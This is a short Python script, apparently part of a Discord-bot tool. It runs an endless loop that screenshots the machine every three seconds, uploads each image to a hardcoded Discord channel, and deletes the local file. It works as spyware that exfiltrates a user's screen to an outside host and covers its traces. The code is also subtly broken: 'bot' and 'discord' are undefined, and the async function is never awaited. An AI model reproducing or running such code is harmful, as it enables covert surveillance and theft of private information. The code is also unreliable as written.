from screen import Screenshot
import time
import os

screenshot = Screenshot()

async def sendScreen():
    count = 0
    determine = count + 1
    while True:
        screenshot.printscreen()
        count += 1
        if count >= determine:
            screenshot_path = f"files\\{count}.png"
            guild = await bot.fetch_guild("1198070162432200865")
            channel = await guild.fetch_channel("1209205802032955413")

            with open(screenshot_path, 'rb') as screenshot_file:
                await channel.send(file=discord.File(screenshot_file, screenshot_path))
                
            os.remove(screenshot_path) # COMMENT OUT IF YOU WANT TO KEEP IT
            determine += 1
        time.sleep(3)

sendScreen()